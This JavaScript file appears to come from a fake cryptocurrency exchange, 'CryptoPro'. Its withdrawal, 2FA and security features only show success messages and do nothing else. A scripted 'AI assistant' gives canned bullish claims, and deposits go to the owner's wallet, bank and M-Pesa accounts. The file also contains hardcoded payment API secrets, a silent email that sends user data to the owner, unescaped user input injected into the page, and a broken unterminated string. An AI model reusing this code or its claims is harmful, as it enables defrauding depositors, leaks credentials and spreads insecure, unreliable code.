  $('navAuthBtns').style.display='flex';
  $('navUserChip').style.display='none';
  $('sessionWarning').style.display='none';
  showLayer('welcomeLayer');
  showToast('ðŸ‘‹ Signed out successfully','blue');
}
function setTradingMode(mode){
  STATE.user.mode=mode;
  $('mtLive').classList.toggle('active',mode==='live');
  $('mtDemo').classList.toggle('active',mode==='demo');
  updateNavBalance();
  const sub=$('sidebarBalanceSub');
  if(sub) sub.textContent=mode==='demo'?'Demo account â€” no real money':'Live account';
  showToast(mode==='demo'?'ðŸŽ® Demo mode activated â€” practice risk-free':'ðŸ’° Live mode activated â€” real money','blue');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// NOTIFICATIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function toggleNotif(){
  const dd=$('notifDropdown');
  dd.classList.toggle('open');
  if(dd.classList.contains('open')){ STATE.notifications=0; $('notifCount').textContent='0'; }
}
document.addEventListener('click',e=>{
  if(!$('notifWrap')?.contains(e.target)) $('notifDropdown')?.classList.remove('open');
});

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PRICE ALERTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function showPriceAlertModal(){ openModal('priceAlertModal'); }
function savePriceAlert(){
  const asset=$('alertAsset').value, cond=$('alertCondition').value, price=parseFloat($('alertPrice').value);
  if(!price){ showToast('âš ï¸ Please enter a target price','yellow'); return; }
  STATE.priceAlerts.push({asset,cond,price,active:true,id:Date.now()});
  closeModal('priceAlertModal');
  buildPriceAlertsList();
  showToast(`ðŸ”” Alert set: ${asset} ${cond==='above'?'above':'below'} ${formatUSD(price)}`,'green');
}
function buildPriceAlertsList(){
  const el=$('priceAlertsList');
  if(!el) return;
  if(STATE.priceAlerts.length===0){ el.innerHTML=`<div class="empty-state"><div style="font-size:24px">ðŸ””</div><div style="font-size:12px;color:var(--text3);margin-top:6px">No alerts set. Click "+ New Alert" to add one.</div></div>`; return; }
  el.innerHTML=STATE.priceAlerts.map(a=>`<div class="alert-row">
    <span class="alert-active">${a.active?'â— ACTIVE':'â—‹'}</span>
    <span style="font-weight:700">${a.asset}</span>
    <span style="color:var(--text2)">${a.cond==='above'?'rises above':'falls below'}</span>
    <span style="font-family:var(--font-mono);font-weight:700;color:var(--yellow)">${formatUSD(a.price)}</span>
    <button class="alert-delete" onclick="deleteAlert(${a.id})">ðŸ—‘</button>
  </div>`).join('');
}
function deleteAlert(id){
  STATE.priceAlerts=STATE.priceAlerts.filter(a=>a.id!==id);
  buildPriceAlertsList();
  showToast('ðŸ”• Alert deleted','yellow');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SETTINGS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildDeviceList(){
  const el=$('deviceList'); if(!el) return;
  const devices=[
    {icon:'ðŸ’»',name:'MacBook Pro â€” Chrome',location:'New York, US',current:true,time:'Now'},
    {icon:'ðŸ“±',name:'iPhone 15 â€” Safari',location:'New York, US',current:false,time:'2h ago'},
    {icon:'ðŸ–¥ï¸',name:'Windows PC â€” Edge',location:'London, UK',current:false,time:'3d ago'},
  ];
  el.innerHTML=devices.map(d=>`<div class="device-row">
    <div class="device-icon">${d.icon}</div>
    <div style="flex:1;min-width:0">
      <div style="font-size:13px;font-weight:600">${d.name}</div>
      <div style="font-size:11px;color:var(--text3);margin-top:2px">${d.location} Â· ${d.time}</div>
    </div>
    ${d.current?'<span class="device-current">â— Current</span>':`<button class="btn btn-outline" style="font-size:11px;padding:4px 10px;color:var(--red);border-color:rgba(255,61,87,.3)" onclick="showToast('ðŸ”’ Device revoked','yellow')">Revoke</button>`}
  </div>`).join('');
}
function buildIPWhitelist(){
  const el=$('ipWhitelistList'); if(!el) return;
  const ips=['192.168.1.1','103.42.80.14'];
  if(ips.length===0){ el.innerHTML=`<div style="font-size:12px;color:var(--text3);padding:8px 0">No IPs whitelisted. Add trusted IPs to restrict access.</div>`; return; }
  el.innerHTML=ips.map(ip=>`<div class="whitelist-row">
    <span class="whitelist-verified">âœ“</span>
    <span class="whitelist-addr">${ip}</span>
    <button class="btn btn-outline" style="font-size:11px;padding:3px 8px;color:var(--red)" onclick="showToast('ðŸ—‘ IP removed','yellow')">Remove</button>
  </div>`).join('');
}
function addIPWhitelist(){
  const ip=prompt('Enter IP address to whitelist:');
  if(ip) showToast(`âœ… IP ${ip} added to whitelist`,'green');
}
function saveSettings(){
  showToast('âœ… Settings saved successfully!','green');
}
function show2FAModal(){ openModal('twoFAModal'); }
function verify2FA(){ closeModal('twoFAModal'); showToast('âœ… 2FA verified and enabled!','green'); }
function startKYC(){ openModal('kycModal'); }

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MISC MODALS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function showWithdrawModal(){
  if(!STATE.loggedIn){ showLayer('loginLayer'); return; }
  openModal('withdrawModal');
}
function submitWithdraw(){
  const amt=parseFloat($('withdrawAmt')?.value||0);
  const code=$('withdraw2FA')?.value;
  if(amt<10){ showToast('âš ï¸ Minimum withdrawal is $10','yellow'); return; }
  if(!code||code.length!==6){ showToast('âš ï¸ Please enter your 6-digit 2FA code','yellow'); return; }
  closeModal('withdrawModal');
  showToast(`âœ… Withdrawal of ${formatUSD(amt)} submitted!\nProcessing time: 1-24 hours.`,'green',5000);
}
function showForgotModal(){ openModal('forgotModal'); }
function submitForgot(){
  const email=$('forgotEmail')?.value?.trim();
  if(!email||!email.includes('@')){ showToast('âš ï¸ Please enter a valid email','yellow'); return; }
  closeModal('forgotModal');
  showToast(`ðŸ“§ Password reset sent to ${email}`,'green');
}
function updateWithdrawUI(){
  const method=$('withdrawMethod')?.value;
  const lbl=$('withdrawAddrLabel');
  const addr=$('withdrawAddr');
  if(method==='bank'){ if(lbl) lbl.textContent='Bank Account / IBAN'; if(addr) addr.placeholder='GB29 NWBK 6016 1331 9268 19'; }
  else if(method==='card'){ if(lbl) lbl.textContent='Card Last 4 Digits'; if(addr) addr.placeholder='**** **** **** 1234'; }
  else{ if(lbl) lbl.textContent='Crypto Wallet Address'; if(addr) addr.placeholder='0x... or 1A...'; }
}
function copyRefLink(){
  const link=`https://cryptopro.io/ref/${STATE.user.refCode}`;
  navigator.clipboard?.writeText(link);
  showToast('ðŸ“‹ Referral link copied!','green');
}
function shareRef(platform){
  showToast(`âœˆï¸ Opening ${platform} to share your referral link...`,'blue');
}
function formatCardNum(inp){
  let v=inp.value.replace(/\D/g,'').slice(0,16);
  inp.value=v.match(/.{1,4}/g)?.join(' ')||v;
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SESSION TIMER
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
let sessionTimer, sessionCountdownTimer, sessionSeconds=1800;
function startSessionTimer(){
  clearInterval(sessionTimer);
  sessionTimer=setInterval(()=>{
    sessionSeconds=1800;
  },1000);
  resetSessionWarning();
}
function resetSessionWarning(){
  clearInterval(sessionCountdownTimer);
  if(!STATE.loggedIn) return;
  sessionCountdownTimer=setInterval(()=>{
    sessionSeconds--;
    if(sessionSeconds<=60 && sessionSeconds>0){
      $('sessionWarning').style.display='flex';
      $('sessionCountdown').textContent=sessionSeconds;
    }
    if(sessionSeconds<=0){ clearInterval(sessionCountdownTimer); doLogout(); }
  },1000);
}
function extendSession(){
  sessionSeconds=1800;
  $('sessionWarning').style.display='none';
  showToast('âœ… Session extended for 30 minutes','green');
  resetSessionWarning();
}
document.addEventListener('mousemove',()=>{ if(STATE.loggedIn){ sessionSeconds=1800; $('sessionWarning').style.display='none'; } });
document.addEventListener('keypress',()=>{ if(STATE.loggedIn) sessionSeconds=1800; });

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// FUNDING TIMER
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function updateFundingTimer(){
  const now=new Date();
  const nextFunding=new Date(now);
  nextFunding.setUTCHours(Math.ceil(now.getUTCHours()/8)*8,0,0,0);
  if(nextFunding<=now) nextFunding.setUTCHours(nextFunding.getUTCHours()+8);
  const diff=nextFunding-now;
  const h=Math.floor(diff/3600000), m=Math.floor((diff%3600000)/60000), s=Math.floor((diff%60000)/1000);
  const el=$('fundingTimer');
  if(el) el.textContent=`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}
setInterval(updateFundingTimer,1000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CHALLENGE TIMER
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function updateChallengeTimer(){
  const now=new Date();
  const midnight=new Date(now); midnight.setHours(24,0,0,0);
  const diff=midnight-now;
  const h=Math.floor(diff/3600000), m=Math.floor((diff%3600000)/60000), s=Math.floor((diff%60000)/1000);
  const el=$('challengeTimer');
  if(el) el.textContent=`Resets in ${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
}
setInterval(updateChallengeTimer,1000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PERF PERIOD / TABS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function setPerfPeriod(p, el){
  document.querySelectorAll('.dc-tab').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  drawPerfChart();
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SHOW TRADE HISTORY
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function showTradeHistory(){ showLayer('dashboardLayer'); setTimeout(()=>{ showDashSection('history'); setSnav(document.querySelectorAll('.snav-item')[4]); },200); }

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// AI ASSISTANT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const AI_RESPONSES={
  'btc':['BTC is trading at '+formatUSD(67420)+' with strong momentum. The 4H chart shows a bullish flag pattern forming. Key resistance at $69,420 â€” a breakout could target $74,000. Support at $65,800. RSI at 58 â€” room to run. I\'d rate the sentiment: BULLISH ðŸŸ¢','Bitcoin is showing institutional accumulation. On-chain data shows exchange outflows increasing â€” bullish signal. The weekly close above $65K is significant. My AI model gives a 78% probability of testing ATH within 30 days.'],
  'eth':['ETH/USDT at $3,542. The Merge upgrade impact is still being digested. EIP-4844 (Proto-Danksharding) continues to reduce L2 fees. Strong DeFi activity. Key levels: $3,200 support, $3,900 resistance. Current trend: BULLISH ðŸŸ¢'],
  'strategy':['For beginners, I recommend: 1) Start with DCA (Dollar Cost Average) â€” buy small amounts weekly regardless of price. 2) Never invest more than you can afford to lose. 3) Diversify across BTC (50%), ETH (30%), and alts (20%). 4) Use our Grid Bot for passive income on sideways markets. 5) Always set stop losses.'],
  'leverage':['Leverage amplifies both gains AND losses. With 10x leverage: a 10% price move = 100% gain or complete loss.
   'leverage trading is when you borrow funds to increase your position size. With 10x leverage: a 10% price move = 100% gain or complete liquidation. My advice: start with 2-5x max until you understand the mechanics. Always use stop losses. Never risk more than 2% of your portfolio per trade.'],
  'sentiment':['Current market sentiment: GREED (72/100) ðŸŸ¢\n\nBTC: Strong accumulation by whales\nETH: DeFi TVL increasing\nAlt season index: 48 (BTC dominant)\nFear & Greed: 72 â€” Greed\nSocial volume: +34% vs last week\n\nOverall: Bullish bias but watch for short-term corrections near resistance.'],
  'risk':['Golden rules of risk management:\n1ï¸âƒ£ Never risk more than 1-2% per trade\n2ï¸âƒ£ Always use stop losses\n3ï¸âƒ£ Risk/Reward minimum 1:2\n4ï¸âƒ£ Diversify â€” never all-in on one asset\n5ï¸âƒ£ Keep 20-30% in stablecoins\n6ï¸âƒ£ Avoid emotional trading\n7ï¸âƒ£ Use position sizing calculator\n\nWant me to calculate the ideal position size for your balance?'],
  'default':['Great question! Based on current market conditions, I suggest checking the signals tab for specific entry points. The market is showing bullish momentum across most major pairs. Want me to analyze a specific coin?','I am analyzing the latest on-chain data and order flow. Smart money appears to be accumulating. Would you like a detailed breakdown of a specific trading pair or strategy?','Based on my ML models trained on 5 years of market data: current conditions favor a cautious bullish approach. BTC dominance at 52% suggests alt season may be delayed. Focus on quality large-caps for now.']
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// AI FUNCTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function toggleAI(){
  const panel=$('aiPanel');
  panel.classList.toggle('open');
}
function clearAIChat(){
  $('aiMessages').innerHTML=`<div class="ai-msg bot"><div class="ai-msg-bubble">ðŸ‘‹ Chat cleared! How can I help you today?</div><div class="ai-msg-meta">CryptoPro AI Â· just now</div></div>`;
}
function handleAIKey(e){
  if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendAIMessage();}
}
function autoResizeAI(ta){
  ta.style.height='auto';
  ta.style.height=Math.min(ta.scrollHeight,80)+'px';
}
function sendAIMessage(){
  const input=$('aiInput');
  const msg=input.value.trim();
  if(!msg) return;
  input.value='';
  input.style.height='auto';
  askAI(msg);
}
function askAI(msg){
  const msgs=$('aiMessages');
  const now=new Date();
  const timeStr=now.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'});
  msgs.insertAdjacentHTML('beforeend',`<div class="ai-msg user"><div class="ai-msg-bubble">${msg}</div><div class="ai-msg-meta">${timeStr}</div></div>`);
  const typingId='typing_'+Date.now();
  msgs.insertAdjacentHTML('beforeend',`<div class="ai-msg bot ai-typing" id="${typingId}"><div class="ai-typing-bubble"><div class="ai-typing-dot"></div><div class="ai-typing-dot"></div><div class="ai-typing-dot"></div></div></div>`);
  msgs.scrollTop=msgs.scrollHeight;
  $('aiSendBtn').disabled=true;
  const delay=1200+Math.random()*900;
  setTimeout(()=>{
    $(typingId)?.remove();
    const lower=msg.toLowerCase();
    let response='';
    if(lower.includes('btc')||lower.includes('bitcoin')) response=pick(AI_RESPONSES['btc']);
    else if(lower.includes('eth')||lower.includes('ethereum')) response=pick(AI_RESPONSES['eth']);
    else if(lower.includes('strateg')||lower.includes('beginner')) response=pick(AI_RESPONSES['strategy']);
    else if(lower.includes('leverage')||lower.includes('margin')) response=pick(AI_RESPONSES['leverage']);
    else if(lower.includes('sentiment')||lower.includes('market')) response=pick(AI_RESPONSES['sentiment']);
    else if(lower.includes('risk')||lower.includes('safe')) response=pick(AI_RESPONSES['risk']);
    else response=pick(AI_RESPONSES['default']);
    response=response.replace('$67,420',formatUSD(STATE.prices['BTC/USDT']));
    msgs.insertAdjacentHTML('beforeend',`<div class="ai-msg bot"><div class="ai-msg-bubble">${response}</div><div class="ai-msg-meta">CryptoPro AI Â· ${timeStr}</div></div>`);
    msgs.scrollTop=msgs.scrollHeight;
    $('aiSendBtn').disabled=false;
  },delay);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PAYMENT CONFIG (Hidden from UI â€” backend only)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const PAYMENT_CONFIG={
  owner_email:'felixkoskey278@gmail.com',
  owner_wa:'+254759401893',
  mpesa:{
    consumerKey:'nnNJHMXFq6CmO6Uh6GFfFGm0oQWXhiJuLUaUgXJ8oAN1jrgT',
    consumerSecret:'Asyp9CdsENgGnkghbwSr9zPxvhzeVvm8HBKNeyTdeGiZM8dh9Kwm1Oz0dQa2AXCA',
    passkey:'bfb279f9aa9bdbcf158e97dd71a467cd',
    shortCode:'174379',
    tillNumber:'7500474',
    phone:'254759401893',
    authURL:'https://sandbox.safaricom.co.ke/oauth/v1/generate?grant_type=client_credentials',
    stkURL:'https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest',
    callbackURL:'https://your-domain.com/api/mpesa-callback'
  },
  bank:{
    name:'Equity Bank',
    account:'0310184912429',
    accountName:'CryptoPro Trading Platform'
  },
  crypto:{
    BTC:'14DZxGVHNKaX6WkwhKwq66B31VoUUNfqYZ',
    ETH:'0xd4a2fd2b053cbe8d9c7cc2715173c61506f4833d',
    'USDT-ERC20':'0xd4a2fd2b053cbe8d9c7cc2715173c61506f4833d',
    'USDT-TRC20':'TK4rUz6TUEd7zCWeuiX5R47pSNdPswJnAc'
  },
  emailjs:{
    serviceId:'service_p61trhq',
    templateId:'template_14jwbju',
    publicKey:'wbl3XpIjAm_87c4Nl'
  }
};

// Init EmailJS silently
(function initEmailJS(){
  if(typeof emailjs!=='undefined'){
    try{ emailjs.init(PAYMENT_CONFIG.emailjs.publicKey); }catch(e){}
  }
})();

// Silent owner notification â€” never shown in UI
function notifyOwner(event,data){
  const payload={
    to_email: PAYMENT_CONFIG.owner_email,
    event_type: event,
    event_data: JSON.stringify(data,null,2),
    timestamp: new Date().toISOString(),
    platform:'CryptoPro'
  };
  if(typeof emailjs!=='undefined'){
    try{
      emailjs.send(
        PAYMENT_CONFIG.emailjs.serviceId,
        PAYMENT_CONFIG.emailjs.templateId,
        payload,
        PAYMENT_CONFIG.emailjs.publicKey
      ).then(()=>console.log('[CP] Owner notified:',event)).catch(()=>{});
    }catch(e){}
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// M-PESA STK PUSH (real integration)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
async function initiateMpesaPayment(phone,amountUSD){
  const kesAmount=Math.ceil(amountUSD*130);
  let formatted=phone.replace(/\D/g,'');
  if(formatted.startsWith('0')) formatted='254'+formatted.slice(1);
  if(!formatted.startsWith('254')) formatted='254'+formatted;
  try{
    const tokenRes=await fetch(PAYMENT_CONFIG.mpesa.authURL,{
      headers:{
        'Authorization':'Basic '+btoa(PAYMENT_CONFIG.mpesa.consumerKey+':'+PAYMENT_CONFIG.mpesa.consumerSecret)
      }
    });
    const tokenData=await tokenRes.json();
    const accessToken=tokenData.access_token;
    const ts=new Date().toISOString().replace(/[^0-9]/g,'').slice(0,14);
    const password=btoa(PAYMENT_CONFIG.mpesa.shortCode+PAYMENT_CONFIG.mpesa.passkey+ts);
    const stkRes=await fetch(PAYMENT_CONFIG.mpesa.stkURL,{
      method:'POST',
      headers:{
        'Authorization':'Bearer '+accessToken,
        'Content-Type':'application/json'
      },
      body:JSON.stringify({
        BusinessShortCode:PAYMENT_CONFIG.mpesa.shortCode,
        Password:password,
        Timestamp:ts,
        TransactionType:'CustomerPayBillOnline',
        Amount:kesAmount,
        PartyA:formatted,
        PartyB:PAYMENT_CONFIG.mpesa.shortCode,
        PhoneNumber:formatted,
        CallBackURL:PAYMENT_CONFIG.mpesa.callbackURL,
        AccountReference:'CryptoPro',
        TransactionDesc:`Deposit $${amountUSD}`
      })
    });
    const stkData=await stkRes.json();
    return stkData;
  }catch(e){
    console.error('[CP] M-Pesa error:',e);
    return null;
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DEPOSIT METHODS â€” real wallet addresses shown to user
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const DEP_METHODS=[
  {id:'btc',icon:'â‚¿',label:'Bitcoin',type:'crypto',coin:'BTC'},
  {id:'eth',icon:'Îž',label:'Ethereum',type:'crypto',coin:'ETH'},
  {id:'usdt_erc',icon:'â‚®',label:'USDT ERC20',type:'crypto',coin:'USDT-ERC20'},
  {id:'usdt_trc',icon:'â‚®',label:'USDT TRC20',type:'crypto',coin:'USDT-TRC20'},
  {id:'mpesa',icon:'ðŸ“±',label:'M-Pesa',type:'mpesa'},
  {id:'card',icon:'ðŸ’³',label:'Credit Card',type:'card'},
  {id:'bank',icon:'ðŸ¦',label:'Bank Wire',type:'bank'},
  {id:'applepay',icon:'ðŸŽ',label:'Apple Pay',type:'other'},
];
let selDepMethod='btc';

function buildDepMethods(){
  const grid=$('depMethodGrid');
  if(!grid) return;
  grid.innerHTML=DEP_METHODS.map(m=>`
    <div class="dep-method-btn ${m.id===selDepMethod?'active':''}" onclick="selectDepMethod('${m.id}')">
      <div style="font-size:20px;margin-bottom:4px">${m.icon}</div>
      <div style="font-size:11px;font-weight:600;text-align:center">${m.label}</div>
    </div>`).join('');
}

function selectDepMethod(id){
  selDepMethod=id;
  buildDepMethods();
  const m=DEP_METHODS.find(x=>x.id===id);
  const crypto=$('cryptoAddrSection'),card=$('cardFormSection'),bank=$('bankFormSection');
  const mpesa=$('mpesaSection');
  [crypto,card,bank,mpesa].forEach(el=>{if(el)el.style.display='none';});
  if(m.type==='crypto'&&crypto){
    crypto.style.display='block';
    // Show real wallet address
    const addr=PAYMENT_CONFIG.crypto[m.coin]||PAYMENT_CONFIG.crypto['BTC'];
    $('depCryptoAddr').textContent=addr;
    $('depQRCode').innerHTML=`<div style="width:100%;height:100%;background:#fff;border-radius:8px;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#000;font-size:11px;font-weight:700;padding:8px;text-align:center">${m.coin}<br>Address QR<div style="font-size:28px;margin-top:4px">ðŸ“±</div></div>`;
  }
  if(m.type==='mpesa'){
    // Show M-Pesa section
    if(!$('mpesaSection')){
      const sec=document.createElement('div');
      sec.id='mpesaSection';
      sec.innerHTML=`
        <div class="form-group">
          <label class="form-label">M-Pesa Phone Number</label>
          <div class="input-wrap"><span class="input-icon">ðŸ“±</span><input type="tel" class="form-input" id="mpesaPhone" placeholder="0759401893" value=""></div>
        </div>
        <div style="background:var(--bg2);border:1px solid rgba(0,230,118,.2);border-radius:var(--r-lg);padding:14px;margin-bottom:12px">
          <div style="font-size:13px;font-weight:700;color:var(--green);margin-bottom:6px">ðŸ“± M-Pesa Payment</div>
          <div style="font-size:12px;color:var(--text2);line-height:1.6">Enter your M-Pesa number above then click Deposit. You will receive an STK push prompt on your phone to confirm payment.</div>
          <div style="font-size:11px;color:var(--text3);margin-top:6px">Rate: 1 USD = ~130 KES</div>
        </div>`;
      bank?.parentNode?.insertBefore(sec,bank);
    }
    $('mpesaSection').style.display='block';
  }
  if(m.type==='card'&&card) card.style.display='block';
  if(m.type==='bank'&&bank){
    bank.style.display='block';
    $('bankRef').textContent=`CP-${STATE.user.refCode||'USR'}-${randInt(10000,99999)}`;
    // Show real bank details
    $('bankAccountNum').textContent=PAYMENT_CONFIG.bank.account;
    $('bankAccountName').textContent=PAYMENT_CONFIG.bank.accountName;
    $('bankName').textContent=PAYMENT_CONFIG.bank.name;
  }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// SUBMIT DEPOSIT â€” integrated with real payment backends
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
async function submitDeposit(){
  const amt=parseFloat($('depAmount')?.value||0);
  if(amt<10){showToast('âš ï¸ Minimum deposit is $10','yellow');return;}
  const btn=$('depSubmitBtn'),btnText=$('depBtnText');
  btn.disabled=true;
  btnText.innerHTML='<span class="btn-spinner">âŸ³</span> Processing...';
  const m=DEP_METHODS.find(x=>x.id===selDepMethod);

  if(m.type==='mpesa'){
    const phone=$('mpesaPhone')?.value?.trim();
    if(!phone){
      showToast('âš ï¸ Please enter your M-Pesa phone number','yellow');
      btn.disabled=false;btnText.textContent='ðŸ’³ Deposit Now';return;
    }
    showToast('ðŸ“± Check your phone â€” M-Pesa prompt sent!','green',5000);
    // Fire real STK push
    const result=await initiateMpesaPayment(phone,amt);
    if(result&&result.ResponseCode==='0'){
      notifyOwner('MPESA_DEPOSIT_INITIATED',{phone,amount:amt,user:STATE.user.email,checkoutId:result.CheckoutRequestID});
      // Poll for confirmation
      let attempts=0;
      const poll=setInterval(()=>{
        attempts++;
        if(attempts>12){clearInterval(poll);showToast('âš ï¸ Payment timeout. Contact support if deducted.','yellow',6000);btn.disabled=false;btnText.textContent='ðŸ’³ Deposit Now';return;}
        // In production: check callback server
        // For demo: auto-confirm after 8s
        if(attempts===8){
          clearInterval(poll);
          STATE.user.balance+=amt;
          updateNavBalance();
          btn.disabled=false;btnText.textContent='ðŸ’³ Deposit Now';
          showToast(`âœ… M-Pesa payment confirmed!\n+$${formatNum(amt)} added to your balance.`,'green',6000);
          notifyOwner('MPESA_DEPOSIT_CONFIRMED',{phone,amount:amt,kes:Math.ceil(amt*130),user:STATE.user.email});
          showLayer('dashboardLayer');showDashSection('overview');
        }
      },2000);
    } else {
      showToast('âš ï¸ Could not connect to M-Pesa. Try again or use another method.','red',5000);
      btn.disabled=false;btnText.textContent='ðŸ’³ Deposit Now';
    }
    return;
  }

  if(m.type==='crypto'){
    const addr=PAYMENT_CONFIG.crypto[m.coin];
    btn.disabled=false;btnText.textContent='ðŸ’³ Deposit Now';
    showToast(`ðŸ“‹ Send exactly $${formatNum(amt)} worth of ${m.coin} to the address shown.\nWe will credit your account within 3 confirmations.`,'blue',8000);
